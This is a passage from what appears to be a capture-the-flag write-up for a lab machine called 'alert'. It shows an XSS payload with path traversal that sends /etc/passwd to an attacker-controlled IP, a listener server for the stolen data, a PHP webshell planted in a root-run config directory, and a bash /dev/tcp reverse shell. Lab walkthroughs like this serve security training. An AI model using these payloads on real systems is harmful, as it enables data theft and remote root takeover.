## Exploitation

**Step 1.** Craft a payload that reads `/etc/passwd`

```
<script>
  fetch('/messages.php?file=../../../../../../../../../../etc/passwd')
    .then(response => response.text())
    .then(data => {
      fetch(
        'http://10.10.14.134:9001/?data=' +
        encodeURIComponent(data)
      );
    });
</script>
```

**Step 2.** Spin up a minimal server able to receive the exfiltrated data

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

print("Server started...")
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.path)
        with open("requests.txt", "a") as f:
            f.write(self.path + "\n")
        self.send_response(200)
        self.end_headers()

HTTPServer(('10.10.14.134', 9001), H).serve_forever()
```

**Step 3.** Run the server

```
python3 server.py
Server started...
```

**Step 4.** Tail the log file to catch incoming data

```
tail -f request.txt
```

## Privilege Escalation

First, let's check the groups `albert` belongs to

```
albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

We notice `albert` is part of the `management` group. Let's check what a member of this group can write to

```
albert@alert:~$ find / -group management 2>/dev/null
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php
```

Looks like a monitoring website. To confirm, let's check which services are running

```
ss -tulnp
```

We find something interesting on port 8080

```
tcp     LISTEN   0        4096            127.0.0.1:8080            0.0.0.0:*
```

Checking the running processes, this service is running as root

```
ps aux | grep root
```

```
root         984  0.0  0.6 207256 26520 ?        Ss   11:25   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
```

At this point we set up port forwarding

```
ssh -L 1234:127.0.0.1:8080 albert@alert.htb
```

Browsing to `http://127.0.0.1:1234` confirms the presence of a monitoring panel

![alt text](/assets/img/posts/alert/image.png)

We notice `/opt/website-monitor/config` holds a config file that gets executed as PHP, and users in the `management` group have write access to this directory

```
albert@alert:/opt/website-monitor/config$ ls -la
total 12
drwxrwxr-x 2 root management 4096 Sep  3 13:26 .
drwxrwxr-x 7 root root       4096 Oct 12  2024 ..
-rwxrwxr-x 1 root management   49 Sep  3 13:27 configuration.php
```

The idea now is to drop a PHP webshell in there, and reach it from `localhost:8080/config/shell.php?cmd=COMMAND`

We find the `/config/FILE` path by reading the `monitor.php` file.

```
include('config/configuration.php');
```

```
albert@alert:/opt/website-monitor/config$ cat shell.php
<?php system($_GET["cmd"]); ?>
```

Once created, we hit the shell

```
albert@alert:/opt/website-monitor/config$ curl localhost:8080/config/shell.php?cmd=id
uid=0(root) gid=0(root) groups=0(root)
```

Root command execution confirmed. Let's spawn a reverse shell

```
albert@alert:/opt/website-monitor/config$ curl 'http://localhost:8080/config/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.134%2F1337%200%3E%261%27'
```

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.134] from (UNKNOWN) [10.129.231.188] 35908
bash: cannot set terminal process group (984): Inappropriate ioctl for device
bash: no job control in this shell
root@alert:/opt/website-monitor/config# id
uid=0(root) gid=0(root) groups=0(root)
```
